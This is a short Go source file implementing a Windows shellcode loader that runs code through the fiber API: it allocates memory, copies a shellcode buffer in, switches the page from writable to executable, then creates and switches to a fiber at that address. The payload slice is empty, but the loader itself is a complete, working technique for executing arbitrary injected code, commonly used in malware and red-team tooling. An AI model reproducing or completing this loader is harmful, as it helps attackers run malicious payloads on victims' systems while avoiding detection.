package main

import (
	"github.com/JamesHovious/w32"
	"my_createFiber/winApi"
	"unsafe"
)

func main() {

	winApi.ProcConvertThreadToFiber()

	shellcode := []byte{}
	shellcodeAddr, _ := w32.VirtualAlloc(0, len(shellcode), w32.MEM_RESERVE|w32.MEM_COMMIT, w32.PAGE_READWRITE)
	winApi.ProcRtlCopyMemory(w32.PVOID(shellcodeAddr), w32.PVOID(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	var oldProtection w32.DWORD = 0
	w32.VirtualProtect(shellcodeAddr, len(shellcode), w32.PAGE_EXECUTE_READ, &oldProtection)

	fiberAddr := winApi.ProcCreateFiber(0, w32.PVOID(shellcodeAddr), w32.PVOID(unsafe.Pointer(nil)))

	winApi.ProcSwitchToFiber(w32.PVOID(fiberAddr))

}
